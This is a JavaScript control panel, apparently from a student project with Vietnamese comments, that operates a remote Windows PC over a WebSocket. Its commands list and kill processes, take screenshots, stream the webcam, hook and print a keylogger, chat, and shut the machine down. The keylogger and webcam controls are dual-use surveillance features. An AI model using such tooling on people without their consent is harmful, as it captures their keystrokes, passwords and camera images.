// --- BIẾN TOÀN CỤC ---
let currentWindow = 0;
let ws = null;
let currentAction = ''; 
let isInSubMenu = false; // Biến này dùng để check xem ta đang ở Main hay Sub
let isKeylogHooked = false;
let isWebcamActive = false;

// Biến Parse Dữ liệu
let parsingMode = null; 
let expectedItems = 0;
let currentItemsReceived = 0;
let tempRowData = []; 
let tempInfoHtml = "";

// --- WEBSOCKET ---
function initWebSocket() {
    ws = new WebSocket("ws://localhost:8080");

    ws.onopen = () => {
        console.log("Connected to Proxy");
        ws.send("GET_SERVERS|"); 
        showToast("Backend Ready", "success");
    };

    ws.onmessage = (event) => {
        try {
            const msg = JSON.parse(event.data);
            handleServerMessage(msg);
        } catch (e) {
            console.log("Raw Data:", event.data);
        }
    };

    ws.onclose = () => {
        showToast("Connection Lost", "error");
        disconnectUI();
    };
}

function handleServerMessage(msg) {
    if (msg.type === "DISCOVERY") {
        const select = document.getElementById('serverSelect');
        let exists = false;
        for (let i = 0; i < select.options.length; i++) {
            if (select.options[i].value === msg.ip) exists = true;
        }
        if (!exists) {
            const option = document.createElement("option");
            option.text = msg.ip;
            option.value = msg.ip;
            select.add(option);
            if (select.options.length === 1 || select.options[0].disabled) {
                if(select.options[0].disabled) select.remove(0);
                select.value = msg.ip;
            }
        }
    } 
    else if (msg.type === "STATUS") {
        if (msg.connected) {
            document.getElementById('homePage').classList.add('hidden');
            setTimeout(() => {
                document.getElementById('mainContainer').classList.add('active');
                updateStatus(true);
                showToast("Connected to Server", "success");
                isInSubMenu = false; // Mới vào thì chắc chắn ở Main Menu
            }, 500);
        } else {
            disconnectUI();
        }
    } 
    else if (msg.type === "ERROR") {
        showToast(msg.msg, "error");
    }
    else if (msg.type === "CHAT") {
        const data = msg.data;
        addChatBubble(data, 'server');
        return;
    }
    else if (msg.type === "LOG") {
        const data = msg.data; 
        
        // 1. XỬ LÝ PHẢN HỒI LỆNH (KILL/START SUCCESS)
        if (data.includes("successfully") || data.includes("Error:") || data.includes("Unable to")) {
            const isError = data.toLowerCase().includes("error") || data.includes("Unable");
            showToast(data.trim(), isError ? "error" : "success");
            
            // Gọi hàm refresh (đã được tối ưu bên dưới)
            setTimeout(() => refreshListAfterAction(), 300);
            return;
        }
        if (currentWindow === 3) {
            // Nếu data ngắn và là số -> Là kích thước file (bỏ qua hoặc log)
            if (data.length < 100 && !isNaN(data)) {
                console.log("Incoming image size: " + data);
                return;
            }
            // Nếu data dài -> Là Base64 ảnh
            if (data.length > 100) {
                const display = document.getElementById('screenshotDisplay');
                // Hiển thị ảnh
                display.innerHTML = `<img src="data:image/png;base64,${data}" alt="Screenshot" style="max-width:100%; border-radius:10px;">`;
                display.classList.add('show');
                document.getElementById('screenshotActions').style.display = 'flex';
                showToast("Screenshot captured", "success");
            }
            return;
        }

        // 3. XỬ LÝ WEBCAM (Tab index 4)
        if (currentWindow === 4) {
             // Webcam gửi luồng liên tục, ta cập nhật src của ảnh liên tục để tạo video
             // Lưu ý: Server C++ của bạn đang gửi từng frame MJPEG
             if (data.length > 100) {
                const videoImg = document.getElementById('webcamTarget'); // Ta sẽ dùng thẻ img thay vì video để render MJPEG
                if(videoImg) videoImg.src = `data:image/jpeg;base64,${data}`;
             }
             return;
        }

        // 2. XỬ LÝ KEYLOG
        if (parsingMode === 'KEYLOG') {
            const keylogOut = document.getElementById('keylogOutput');
            let formatted = data.replace(/\n/g, "<br>");
            keylogOut.innerHTML += formatted + "<br>"; 
            keylogOut.scrollTop = keylogOut.scrollHeight;
            return;
        }

        // 3. XỬ LÝ DANH SÁCH (PROCESS / APP)
        if (parsingMode === 'PROCESS' || parsingMode === 'APP') {
            if (expectedItems === 0) {
                if (!isNaN(data.trim()) && parseInt(data.trim()) > 0) {
                    expectedItems = parseInt(data.trim());
                    currentItemsReceived = 0;
                    tempRowData = [];
                    const listId = parsingMode === 'PROCESS' ? 'processList' : 'appList';
                    document.getElementById(listId).innerHTML = ''; 
                    console.log(`Receiving ${expectedItems} items...`);
                } else if (data.trim() === "0") {
                    const listId = parsingMode === 'PROCESS' ? 'processList' : 'appList';
                    document.getElementById(listId).innerHTML = '<div class="loading-text">No items found.</div>';
                }
            } else {
                tempRowData.push(data.trim());
                const linesPerItem = parsingMode === 'PROCESS' ? 3 : 4;
                
                if (tempRowData.length === linesPerItem) {
                    renderListItem(tempRowData); 
                    tempRowData = []; 
                    currentItemsReceived++;
                    
                    if (currentItemsReceived >= expectedItems) {
                        expectedItems = 0;
                        showToast("List updated", "success");
                    }
                }
            }
        }
        if (parsingMode === 'INFO') {
            const data = msg.data;
            
            if (data === "END_INFO") {
                // Đã nhận xong toàn bộ -> Render ra màn hình
                document.getElementById('systemInfoGrid').innerHTML = tempInfoHtml;
                parsingMode = null;
                showToast("System Info Updated", "success");
            } 
            else if (data.startsWith("KEY:")) {
                // Parse format: "KEY:Label|Value"
                const parts = data.substring(4).split('|');
                if (parts.length >= 2) {
                    const label = parts[0];
                    const value = parts[1];
                    
                    // Chọn icon dựa trên label
                    let icon = '💻';
                    if (label.includes('CPU')) icon = '⚙️';
                    if (label.includes('RAM')) icon = '💾';
                    if (label.includes('Disk')) icon = '💿';
                    if (label.includes('User')) icon = '👤';
                    if (label.includes('OS')) icon = '🪟';

                    tempInfoHtml += `
                        <div class="info-card">
                            <div class="info-icon">${icon}</div>
                            <div class="info-label">${label}</div>
                            <div class="info-value">${value}</div>
                        </div>
                    `;
                }
            }
            return; 
        }
    }
}

function renderListItem(data) {
    if (parsingMode === 'PROCESS') {
        const html = `
            <div class="data-row">
                <div class="col-main">
                    <div class="row-icon">⚙️</div>
                    <div class="row-info">
                        <span class="row-name" title="${data[0]}">${data[0]}</span>
                        <span class="row-sub">PID: ${data[1]}</span>
                    </div>
                </div>
                <div class="col-detail"><span class="badge">${data[2]} Threads</span></div>
            </div>`;
        document.getElementById('processList').insertAdjacentHTML('beforeend', html);
    } else {
        const html = `
            <div class="data-row">
                <div class="col-main">
                    <div class="row-icon">🖥️</div>
                    <div class="row-info">
                        <span class="row-name" title="${data[0]}">${data[0]}</span>
                        <span class="row-sub">${data[1]}</span>
                    </div>
                </div>
                <div class="col-detail"><span class="badge">PID: ${data[2]}</span></div>
            </div>`;
        document.getElementById('appList').insertAdjacentHTML('beforeend', html);
    }
}

// --- HÀM REFRESH ĐƠN GIẢN ---
function refreshListAfterAction() {
    // Chỉ cần gọi lại Show. Logic thông minh nằm trong hàm Show.
    if (parsingMode === 'APP') showAppList(); 
    else showProcessList();
}

// --- LOGIC HIỂN THỊ LIST (ĐÃ SỬA LỖI 2 QUIT) ---
function showProcessList() {
    // 1. Reset UI
    document.getElementById('processList').style.display = 'block';
    document.getElementById('processList').innerHTML = '<div class="loading-text">⟳ Fetching processes...</div>';
    parsingMode = 'PROCESS';
    expectedItems = 0;
    currentItemsReceived = 0;

    // 2. Logic xử lý Server State
    if (!isInSubMenu) {
        // TRƯỜNG HỢP A: Đang ở Main Menu -> Vào thẳng
        ws.send("CMD|PROCESS");
        isInSubMenu = true;
        setTimeout(() => ws.send("CMD|XEM"), 300);
    } else {
        // TRƯỜNG HỢP B: Đang ở Sub Menu (hoặc kẹt ở Kill)
        // Gửi ĐÚNG 1 lệnh QUIT.
        // - Nếu đang ở Process -> Ra Main.
        // - Nếu đang ở Kill -> Ra Process.
        ws.send("CMD|QUIT");
        
        setTimeout(() => {
            // Sau khi QUIT, ta gửi lệnh PROCESS.
            // - Nếu nãy ra Main -> Giờ vào Process (Đúng ý).
            // - Nếu nãy ra Process -> Giờ gửi "PROCESS" (Server Process loop ko hiểu lệnh này -> Bỏ qua -> Vẫn ở Process) (Không sao cả).
            ws.send("CMD|PROCESS");
            isInSubMenu = true;

            setTimeout(() => {
                ws.send("CMD|XEM");
            }, 300);
        }, 300);
    }
}

function showAppList() {
    document.getElementById('appList').style.display = 'block';
    document.getElementById('appList').innerHTML = '<div class="loading-text">⟳ Fetching applications...</div>';
    parsingMode = 'APP';
    expectedItems = 0;
    currentItemsReceived = 0;

    if (!isInSubMenu) {
        ws.send("CMD|APPLICATION");
        isInSubMenu = true;
        setTimeout(() => ws.send("CMD|XEM"), 300);
    } else {
        ws.send("CMD|QUIT");
        setTimeout(() => {
            ws.send("CMD|APPLICATION");
            isInSubMenu = true;
            setTimeout(() => ws.send("CMD|XEM"), 300);
        }, 300);
    }
}

function showInput(action) {
    if (action.includes('App')) parsingMode = 'APP';
    else parsingMode = 'PROCESS';

    // Đảm bảo đã vào menu con.
    // Nếu chưa vào (ví dụ người dùng bấm Kill ngay khi vừa kết nối)
    if (!isInSubMenu) {
        if (parsingMode === 'APP') ws.send("CMD|APPLICATION");
        else ws.send("CMD|PROCESS");
        isInSubMenu = true;
    }
    
    currentAction = action;
    const modal = document.getElementById('inputModal');
    const input = document.getElementById('modalInput');
    
    input.value = '';
    modal.classList.add('active');
    
    if (action.includes('kill')) {
        document.getElementById('modalTitle').textContent = 'Terminate';
        input.placeholder = 'Enter PID (e.g. 1234)';
    } else {
        document.getElementById('modalTitle').textContent = 'Start';
        input.placeholder = 'Enter Name (e.g. notepad)';
    }
    input.focus();
}

function closeModal() { document.getElementById('inputModal').classList.remove('active'); }

function submitInput() {
    closeModal();
    const value = document.getElementById('modalInput').value.trim();
    if (!value) return;

    // Gửi lệnh + ID. Không gửi QUIT.
    if (currentAction.includes('kill')) {
        ws.send("CMD|KILL");
        setTimeout(() => ws.send("CMD|KILLID"), 50);
        setTimeout(() => ws.send(`CMD|${value}`), 100);
    } 
    else if (currentAction.includes('start')) {
        ws.send("CMD|START");
        setTimeout(() => ws.send("CMD|STARTID"), 50);
        setTimeout(() => ws.send(`CMD|${value}`), 100);
    }

    showToast('Processing...', 'info');
}

// --- CORE FUNCTIONS ---
function connect() {
    const ip = document.getElementById('serverSelect').value;
    if (!ip) return showToast('Select a server first', 'warning');
    ws.send(`CONNECT|${ip}`);
}

function disconnect() {
    // Reset an toàn khi disconnect
    if(isInSubMenu) ws.send("CMD|QUIT"); 
    isInSubMenu = false;
    setTimeout(() => ws.send("DISCONNECT|"), 200);
}

function disconnectUI() {
    updateStatus(false);
    document.getElementById('mainContainer').classList.remove('active');
    document.getElementById('homePage').classList.remove('hidden');
    currentWindow = 0;
    isInSubMenu = false;
    parsingMode = null;
    document.getElementById('windowsWrapper').style.transform = `translateX(0)`;
}

function updateStatus(connected) {
    const box = document.getElementById('statusBox');
    const text = document.getElementById('statusText');
    box.className = connected ? 'status-box connected' : 'status-box disconnected';
    text.textContent = connected ? 'Connected' : 'Disconnected';
    if(connected) text.classList.add('success'); else text.classList.remove('success');
}

function navigateTo(index) {
    if (currentWindow === index) return;

    // --- BƯỚC 1: DỌN DẸP TAB CŨ (Logic cũ giữ nguyên nhưng tinh chỉnh) ---
    
    // Nếu đang ở Keylog (2) hoặc Webcam (4) hoặc Chat (5) -> Gửi QUIT để thoát vòng lặp Server
    if (currentWindow === 2 || currentWindow === 4 || currentWindow === 5 || isInSubMenu) {
        
        // Tắt Hook/Webcam nếu quên tắt (Logic an toàn từ bước trước)
        if (currentWindow === 2 && isKeylogHooked) {
            ws.send("CMD|UNHOOK");
            isKeylogHooked = false;
        }
        if (currentWindow === 4 && isWebcamActive) {
            ws.send("CMD|STOP");
            isWebcamActive = false;
            document.getElementById('liveIndicator').classList.remove('active');
        }

        // Thoát menu hiện tại
        ws.send("CMD|QUIT");
        isInSubMenu = false;
    }

    // --- BƯỚC 2: THIẾT LẬP TAB MỚI ---
    
    // Reset chế độ parse dữ liệu
    parsingMode = null;
    
    // Thực hiện chuyển cảnh UI
    performUITransition(index); 

    // [QUAN TRỌNG] Gửi lệnh vào Menu ngay lập tức
    if (index === 2) { 
        // Tab Keylog
        ws.send("CMD|KEYLOG");
        isInSubMenu = true; // Đánh dấu là đã vào menu con
        console.log("Entered Keylog Menu");
    } 
    else if (index === 4) {
        // Tab Webcam
        ws.send("CMD|WEBCAM");
        isInSubMenu = true;
        console.log("Entered Webcam Menu");
    }
    else if (index === 5) {
        // Tab Chat
        ws.send("CMD|CHAT");
        isInSubMenu = true;
        setTimeout(() => startChatSession(), 300); // Chat có thể cần init UI
    }
    else if (index === 6) {
        // Tab System Info
        fetchSystemInfo();
    }
}
function enterNewTab(index) {
    // XỬ LÝ KHI VÀO TAB MỚI
    if (index == 5) {
        setTimeout(() => startChatSession(), 50);
    }
    if (index == 6) {
        fetchSystemInfo();
    }
    performUITransition(index);
}

// Hàm phụ trách việc trượt giao diện (Tách ra để tái sử dụng)
function performUITransition(index) {
    currentWindow = index;
    const wrapper = document.getElementById('windowsWrapper');
    wrapper.style.transform = `translateX(-${index * 100}vw)`;
    
    // Cập nhật thanh gạch chân (Indicator)
    const buttons = document.querySelectorAll('.nav-btn');
    const btn = buttons[index];
    const indicator = document.getElementById('navIndicator');
    if(btn) {
        indicator.style.width = btn.offsetWidth + 'px';
        indicator.style.left = btn.offsetLeft + 'px';
    }
}

// --- ACTIONS KEYLOG ---
function hookKeylog() {
    if (isKeylogHooked) return showToast('Keylog is already running', 'warning');
    
    // Chỉ gửi lệnh HOOK ngay lập tức
    ws.send("CMD|HOOK");
    
    isKeylogHooked = true;
    showToast('Keylog Hooked', 'success');
}

function unhookKeylog() {
    if (!isKeylogHooked) return showToast('Keylog is NOT running', 'error');

    // Chỉ gửi lệnh UNHOOK
    ws.send("CMD|UNHOOK");
    
    isKeylogHooked = false;
    showToast('Keylog Unhooked', 'warning');
}

function printKeylog() {
    if(isInSubMenu) { ws.send("CMD|QUIT"); isInSubMenu=false; }
    
    parsingMode = 'KEYLOG'; 
    const output = document.getElementById('keylogOutput');
    output.style.display = 'block';
    if (output.innerHTML.trim() !== "") {
        output.innerHTML += '<div class="log-separator">---------------- NEW SESSION ----------------</div>';
    }
    output.scrollTop = output.scrollHeight;

    ws.send("CMD|PRINT");

}

function deleteLogs() {
    if(!confirm("Clear Keylog history on screen?")) return;
    document.getElementById('keylogOutput').innerHTML = '';
    ws.send("CMD|DELETE");
    showToast('Screen history cleared', 'success');
}

function shutdownServer() {
    if(confirm("Shutdown remote PC?")) {
        if (isInSubMenu) ws.send("CMD|QUIT");
        setTimeout(() => ws.send("CMD|SHUTDOWN"), 300);
    }
}
function restartServer() { 
    if(confirm("Restart remote PC?")) {
        if (isInSubMenu) ws.send("CMD|QUIT");
        setTimeout(() => ws.send("CMD|RESTART"), 300);
    }
}

// --- INIT ---
window.onload = () => {
    initWebSocket();
    document.getElementById('modalInput').value = '';
    const btn = document.querySelector('.nav-btn');
    if(btn) document.getElementById('navIndicator').style.width = btn.offsetWidth + 'px';
};
function handleModalEnterKey(e) { if(e.key==='Enter') submitInput(); }
// --- SCREENSHOT ACTIONS ---
function captureScreenshot() {
    // 1. Vào Menu TAKEPIC
    ws.send("CMD|TAKEPIC");
    isInSubMenu = true;

    // 2. Gửi lệnh chụp (TAKE) sau 200ms
    showToast("Capturing screen...", "info");
    setTimeout(() => {
        ws.send("CMD|TAKE");
    }, 300);
}

function saveScreenshot() {
    const img = document.querySelector('#screenshotDisplay img');
    if (img) {
        const link = document.createElement('a');
        link.href = img.src;
        link.download = `screenshot_${new Date().getTime()}.png`;
        link.click();
        showToast("Screenshot saved", "success");
    } else {
        showToast("No image to save", "warning");
    }
}

function deleteScreenshot() {
    document.getElementById('screenshotDisplay').innerHTML = '';
    document.getElementById('screenshotActions').style.display = 'none';
    showToast("Screenshot cleared", "info");
}

// --- WEBCAM ACTIONS ---
function startWebcam() {
    if (isWebcamActive) return showToast('Webcam is already streaming', 'warning');

    // Setup UI
    const container = document.getElementById('webcamVideo').parentNode;
    if (!document.getElementById('webcamTarget')) {
        const img = document.createElement('img');
        img.id = 'webcamTarget';
        img.style.width = '100%';
        img.style.borderRadius = '10px';
        container.appendChild(img);
        document.getElementById('webcamVideo').style.display = 'none';
    }

    // Chỉ gửi lệnh START (Server đã ở trong vòng lặp Webcam từ lúc chọn Tab)
    ws.send("CMD|START");
    
    document.getElementById('liveIndicator').classList.add('active');
    isWebcamActive = true;
    showToast("Webcam started", "success");
}

function endWebcam() {
    if (!isWebcamActive) return showToast('Webcam is NOT running', 'error');
    ws.send("CMD|STOP");
    
    document.getElementById('liveIndicator').classList.remove('active');
    const target = document.getElementById('webcamTarget');
    if(target) target.src = "";
    
    isWebcamActive = false;
    showToast("Webcam stopped", "warning");
}

function fetchSystemInfo() {
    document.getElementById('systemInfoGrid').innerHTML = '<div class="loading-text">⟳ Scanning System...</div>';
    if (isInSubMenu) {
        ws.send("CMD|QUIT");
        isInSubMenu = false;
    }
    parsingMode = 'INFO';
    tempInfoHtml = "";
    setTimeout(() => {
        ws.send("CMD|INFO");
    }, 200);
}

// --- SYSTEM CONTROL ---
function shutdownServer() {
    if(confirm("Are you sure you want to SHUTDOWN the remote PC?")) {
        // Lệnh Shutdown thường là lệnh 1 chiều, Server sẽ tắt ngay
        if (isInSubMenu) {
            ws.send("CMD|QUIT"); // Thoát menu con nếu đang kẹt
            setTimeout(() => ws.send("CMD|SHUTDOWN"), 200);
        } else {
            ws.send("CMD|SHUTDOWN");
        }
        showToast("Shutdown command sent", "success");
    }
}

function restartServer() {
    // Server.cpp của bạn hiện tại chưa expose lệnh RESTART ra ngoài vòng lặp chính
    // Nhưng nếu bạn update server, logic sẽ như sau:
    if(confirm("Are you sure you want to RESTART the remote PC?")) {
         if (isInSubMenu) {
            ws.send("CMD|QUIT");
            setTimeout(() => ws.send("CMD|RESTART"), 200); // Server cần handle chuỗi này
        } else {
            ws.send("CMD|RESTART");
        }
        showToast("Restart command sent", "success");
    }
}

// --- HÀM SHOW TOAST (BỊ THIẾU) ---
function showToast(message, type = 'info') {
    const container = document.getElementById('toastContainer');
    if (!container) return;

    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    
    // Chọn icon tương ứng
    let icon = 'ℹ️';
    if (type === 'success') icon = '✓';
    else if (type === 'error') icon = '✕';
    else if (type === 'warning') icon = '⚠️';

    toast.innerHTML = `
        <div class="toast-icon">${icon}</div>
        <div class="toast-content">
            <div class="toast-message">${message}</div>
        </div>
    `;

    container.appendChild(toast);

    // Hiệu ứng hiện ra
    requestAnimationFrame(() => {
        toast.classList.add('show');
    });

    // Tự động biến mất sau 3 giây
    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => {
            if (container.contains(toast)) container.removeChild(toast);
        }, 400);
    }, 3000);
}

// --- CHAT FUNCTIONS ---
function startChatSession() {
    // 1. Vào Menu CHAT
    ws.send("CMD|CHAT");
    isInSubMenu = true;
    
    // 2. Gửi lệnh hiện cửa sổ sau 1 chút
    setTimeout(() => {
        ws.send("CMD|START");
        document.getElementById('chatMessages').innerHTML = '<div class="chat-bubble system">Connecting to chat service...</div>';
    }, 300);
}

function sendChatMessage() {
    const input = document.getElementById('chatInput');
    const text = input.value.trim();
    if (!text) return;

    // Gửi lệnh: CMD | MSG | Nội dung
    // Backend server.cpp cần xử lý prefix "MSG|"
    ws.send(`CMD|MSG|${text}`); 
    
    // Hiện lên UI của mình
    addChatBubble(text, 'me');
    input.value = '';
}

function handleChatKey(e) {
    if (e.key === 'Enter') sendChatMessage();
}

function addChatBubble(text, type) {
    const container = document.getElementById('chatMessages');
    const div = document.createElement('div');
    
    // Nếu là tin từ server, nó có thể có prefix "[Server]:", ta có thể lọc nếu muốn
    div.className = `chat-bubble ${type}`;
    div.textContent = text;
    
    container.appendChild(div);
    container.scrollTop = container.scrollHeight;
}